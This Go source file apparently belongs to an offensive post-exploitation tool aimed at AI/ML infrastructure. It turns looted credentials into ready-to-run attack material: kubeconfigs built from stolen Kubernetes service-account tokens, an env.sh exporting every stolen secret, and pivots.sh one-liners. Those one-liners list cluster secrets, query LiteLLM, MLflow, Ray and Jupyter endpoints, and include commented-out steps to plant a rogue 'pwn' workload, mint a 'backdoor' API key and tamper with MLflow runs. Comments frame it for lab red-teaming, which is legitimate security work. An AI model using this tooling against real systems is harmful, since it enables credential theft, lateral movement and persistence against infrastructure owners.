package main

import (
	"fmt"
	"os"
	"path/filepath"
	"regexp"
	"sort"
	"strings"
)

// The manual/ handoff is the native-tooling counterpart to commands.sh: where commands.sh
// re-invokes aipostex with looted credentials, manual/ hands the operator a ready-to-use
// NATIVE session — a kubeconfig built from a stolen SA token, an env.sh of exports, and
// pivots.sh with raw kubectl/curl one-liners — so "you own it" continues by hand.
//
// Reuse-don't-reinvent: for footholds where aipostex already has robust callback/session
// handling (a2a card-spoof OOB listener, ray beacon), pivots.sh points back at the tool
// rather than hand-rolling a raw equivalent.

var shellIdentRe = regexp.MustCompile(`^[A-Za-z_][A-Za-z0-9_]*$`)

// writeDossierManual writes the manual/ native-handoff subdir. Returns (kubeconfigs, pivots).
func writeDossierManual(dir string, creds []dossierCredential) (int, int, error) {
	if len(creds) == 0 {
		return 0, 0, nil
	}
	mdir := filepath.Join(dir, "manual")
	if err := os.MkdirAll(mdir, 0o700); err != nil {
		return 0, 0, fmt.Errorf("creating dossier manual dir: %w", err)
	}

	// 1. kubeconfig-<ns> per stolen SA token (owner-only — embeds the raw token).
	kubeconfigs := 0
	kcByNS := map[string]string{} // ns -> filename, so pivots.sh can reference it
	for _, c := range creds {
		if c.Type != "k8s-sa-token" || strings.TrimSpace(c.Value) == "" {
			continue
		}
		ns := k8sNamespaceFromCredName(c.Name)
		server := forceHTTPS(firstNonEmpty(c.TargetURL, c.SourceTarget))
		if server == "" {
			continue
		}
		fname := "kubeconfig-" + sanitizeDossierName(ns)
		if _, done := kcByNS[ns]; done {
			continue // one kubeconfig per namespace is enough
		}
		if err := os.WriteFile(filepath.Join(mdir, fname), []byte(buildKubeconfig(server, c.Value, ns)), 0o600); err != nil {
			return 0, 0, err
		}
		kcByNS[ns] = fname
		kubeconfigs++
	}

	// 2. env.sh — export NAME=value for every looted credential (owner-only).
	var env strings.Builder
	env.WriteString("#!/usr/bin/env bash\n")
	env.WriteString("# aipostex dossier — looted credentials as environment exports.\n")
	env.WriteString("# `source manual/env.sh` then reuse $VARS in raw curl/kubectl. Owner-only (secrets).\n\n")
	seenEnv := map[string]struct{}{}
	for _, c := range creds {
		if strings.TrimSpace(c.Value) == "" {
			continue
		}
		name := envNameForCredential(c)
		if name == "" {
			continue
		}
		if _, dup := seenEnv[name]; dup {
			continue
		}
		seenEnv[name] = struct{}{}
		fmt.Fprintf(&env, "export %s=%s\n", name, shellSingleQuote(c.Value))
	}
	if err := os.WriteFile(filepath.Join(mdir, "env.sh"), []byte(env.String()), 0o600); err != nil {
		return 0, 0, err
	}

	// 3. pivots.sh — raw native one-liners per credential (owner-only executable).
	var piv strings.Builder
	piv.WriteString("#!/usr/bin/env bash\n")
	piv.WriteString("# aipostex dossier — NATIVE post-exploitation pivots (kubectl / curl), grouped by loot.\n")
	piv.WriteString("# The manual counterpart to commands.sh. Review before running; READ-ONLY unless a\n")
	piv.WriteString("# line is marked DESTRUCTIVE (those are commented out — uncomment deliberately).\n")
	piv.WriteString("# For agent (a2a) / beacon footholds, reuse the tool's OOB listener instead:\n")
	piv.WriteString("#   aipostex a2a --target <url> card-spoof --callback-url http://<you>:<port>/ --force-exploit\n\n")
	pivots := 0
	// Deterministic order: by type then name.
	ordered := append([]dossierCredential(nil), creds...)
	sort.SliceStable(ordered, func(i, j int) bool {
		if ordered[i].Type != ordered[j].Type {
			return ordered[i].Type < ordered[j].Type
		}
		return ordered[i].Name < ordered[j].Name
	})
	for _, c := range ordered {
		lines := nativePivotsForCredential(c, kcByNS)
		if len(lines) == 0 {
			continue
		}
		pivots++
		for _, l := range lines {
			piv.WriteString(l + "\n")
		}
		piv.WriteString("\n")
	}
	if pivots == 0 {
		piv.WriteString("# No credentials with a native pivot — see commands.sh for aipostex follow-ons.\n")
	}
	// 0o700: pivots.sh embeds looted credentials inline (same policy as commands.sh).
	if err := os.WriteFile(filepath.Join(mdir, "pivots.sh"), []byte(piv.String()), 0o700); err != nil { //nolint:gosec // intentional owner-only executable operator script
		return 0, 0, err
	}
	return kubeconfigs, pivots, nil
}

// nativePivotsForCredential returns raw kubectl/curl lines for a credential, or nil if the
// type has no well-defined native equivalent (kept honest — no speculative endpoints).
// kcByNS maps a namespace to its kubeconfig filename (for k8s-sa-token).
func nativePivotsForCredential(c dossierCredential, kcByNS map[string]string) []string {
	target := strings.TrimSpace(c.TargetURL)
	val := c.Value
	switch c.Type {
	case "k8s-sa-token":
		ns := k8sNamespaceFromCredName(c.Name)
		fname, ok := kcByNS[ns]
		if !ok {
			return nil
		}
		kc := `"$(dirname "$0")/` + fname + `"`
		return []string{
			"# k8s: stolen '" + ns + "' SA token — native kubectl (READ-ONLY)",
			"kubectl --kubeconfig " + kc + " auth can-i --list",
			"kubectl --kubeconfig " + kc + " get secrets --all-namespaces",
			"# DESTRUCTIVE — persists a rogue workload; reset the lab to clean:",
			"# kubectl --kubeconfig " + kc + " -n " + ns + " create deployment pwn --image=busybox:1.36 -- sh -c 'sleep infinity'",
		}
	case "litellm-master-key":
		if target == "" {
			return nil
		}
		auth := shellSafeArg("Authorization: Bearer " + val)
		return []string{
			"# litellm: looted master key — native curl (READ-ONLY)",
			`curl -sS ` + shellSafeArg(target+`/v1/models`) + ` -H ` + auth,
			"# real multi-provider inference through the proxy (uses upstream credits):",
			`# curl -sS ` + shellSafeArg(target+`/v1/chat/completions`) + ` -H ` + auth + ` -H 'Content-Type: application/json' -d '{"model":"<model>","messages":[{"role":"user","content":"ping"}]}'`,
			"# DESTRUCTIVE — mints a backdoor API key; reset the lab to clean:",
			`# curl -sS ` + shellSafeArg(target+`/key/generate`) + ` -H ` + auth + ` -H 'Content-Type: application/json' -d '{"key_alias":"backdoor"}'`,
		}
	case "mlflow-basic-auth":
		if target == "" {
			return nil
		}
		auth := shellSafeArg("Authorization: Basic " + val)
		return []string{
			"# mlflow: looted Basic auth — native curl (READ-ONLY)",
			`curl -sS -H ` + auth + ` -H 'Content-Type: application/json' ` + shellSafeArg(target+`/api/2.0/mlflow/experiments/search`) + ` -d '{"max_results":100}'`,
			"# DESTRUCTIVE — tampers a run (supply-chain); reset the lab to clean:",
			`# curl -sS -H ` + auth + ` -H 'Content-Type: application/json' ` + shellSafeArg(target+`/api/2.0/mlflow/runs/log-parameter`) + ` -d '{"run_id":"<id>","key":"x","value":"y"}'`,
		}
	case "mlflow-url":
		if target == "" {
			return nil
		}
		return []string{
			"# mlflow: disclosed tracking URL — native curl (READ-ONLY)",
			`curl -sS -H 'Content-Type: application/json' ` + shellSafeArg(target+`/api/2.0/mlflow/experiments/search`) + ` -d '{"max_results":100}'`,
		}
	case "ray-dashboard-token":
		if target == "" {
			return nil
		}
		return []string{
			"# ray: dashboard token — native curl (READ-ONLY)",
			`curl -sS -H ` + shellSafeArg("Authorization: Bearer "+val) + ` ` + shellSafeArg(target+`/api/jobs/`),
		}
	case "hf-token":
		if target == "" {
			return nil
		}
		return []string{
			"# huggingface: looted token — native curl (READ-ONLY; assumes a TGI /generate endpoint)",
			`curl -sS -H ` + shellSafeArg("Authorization: Bearer "+val) + ` -H 'Content-Type: application/json' ` + shellSafeArg(target+`/generate`) + ` -d '{"inputs":"ping","parameters":{"max_new_tokens":8}}'`,
		}
	case "openai-api-key", "anthropic-api-key", "api-key", "bearer-token":
		if target == "" {
			return nil
		}
		return []string{
			"# openai-compatible: looted key — native curl (READ-ONLY)",
			`curl -sS ` + shellSafeArg(target+`/v1/models`) + ` -H ` + shellSafeArg("Authorization: Bearer "+val),
		}
	case "jupyter-token":
		if target == "" {
			return nil
		}
		return []string{
			"# jupyter: looted token — native curl (READ-ONLY)",
			`curl -sS -H ` + shellSafeArg("Authorization: token "+val) + ` ` + shellSafeArg(target+`/api/sessions`),
		}
	default:
		// wandb (verbose GraphQL), db-connection-string (viewer-only), and unknown types
		// have no clean native one-liner — env.sh still exports them; use commands.sh.
		return nil
	}
}

// buildKubeconfig renders a kubeconfig that authenticates as a stolen SA token against an
// insecure kube-apiserver — ready for `kubectl --kubeconfig <file>`.
func buildKubeconfig(server, token, namespace string) string {
	if namespace == "" {
		namespace = "default"
	}
	var b strings.Builder
	b.WriteString("apiVersion: v1\n")
	b.WriteString("kind: Config\n")
	b.WriteString("clusters:\n")
	b.WriteString("- name: looted\n")
	b.WriteString("  cluster:\n")
	b.WriteString("    server: " + server + "\n")
	b.WriteString("    insecure-skip-tls-verify: true\n")
	b.WriteString("contexts:\n")
	b.WriteString("- name: looted\n")
	b.WriteString("  context:\n")
	b.WriteString("    cluster: looted\n")
	b.WriteString("    user: stolen-sa\n")
	b.WriteString("    namespace: " + namespace + "\n")
	b.WriteString("current-context: looted\n")
	b.WriteString("users:\n")
	b.WriteString("- name: stolen-sa\n")
	b.WriteString("  user:\n")
	b.WriteString("    token: " + token + "\n")
	return b.String()
}

// envNameForCredential derives a shell-safe env var name for a credential: its own Name if
// that's already a valid identifier, else a stable name from its type.
func envNameForCredential(c dossierCredential) string {
	if shellIdentRe.MatchString(c.Name) {
		return strings.ToUpper(c.Name)
	}
	switch c.Type {
	case "k8s-sa-token":
		return "SA_TOKEN"
	case "hf-token":
		return "HF_TOKEN"
	case "litellm-master-key":
		return "LITELLM_MASTER_KEY"
	case "mlflow-basic-auth":
		return "MLFLOW_BASIC_AUTH"
	case "mlflow-url":
		return "MLFLOW_URL"
	case "mlflow-run-id":
		return "MLFLOW_RUN_ID"
	case "ray-dashboard-token":
		return "RAY_TOKEN"
	case "jupyter-token":
		return "JUPYTER_TOKEN"
	case "openai-api-key":
		return "OPENAI_API_KEY"
	case "anthropic-api-key":
		return "ANTHROPIC_API_KEY"
	case "api-key":
		return "API_KEY"
	case "bearer-token":
		return "BEARER_TOKEN"
	case "wandb-api-key":
		return "WANDB_API_KEY"
	case "db-connection-string":
		return "DB_URL"
	default:
		return ""
	}
}

// k8sNamespaceFromCredName pulls the namespace out of a k8s-sa-token cred name like
// "ml-prod/llama-inference-… service-account token" → "ml-prod".
func k8sNamespaceFromCredName(name string) string {
	name = strings.TrimSpace(name)
	if name == "" {
		return "default"
	}
	if i := strings.Index(name, "/"); i > 0 {
		return name[:i]
	}
	if f := strings.Fields(name); len(f) > 0 && !strings.Contains(f[0], " ") {
		return f[0]
	}
	return "default"
}

func forceHTTPS(url string) string {
	url = strings.TrimSpace(url)
	if url == "" {
		return ""
	}
	url = strings.TrimPrefix(strings.TrimPrefix(url, "https://"), "http://")
	return "https://" + url
}

func firstNonEmpty(vals ...string) string {
	for _, v := range vals {
		if strings.TrimSpace(v) != "" {
			return strings.TrimSpace(v)
		}
	}
	return ""
}

// shellSingleQuote wraps s in single quotes, escaping any embedded single quote, so it's
// safe as a literal in env.sh regardless of the credential's contents.
func shellSingleQuote(s string) string {
	return "'" + strings.ReplaceAll(s, "'", `'\''`) + "'"
}
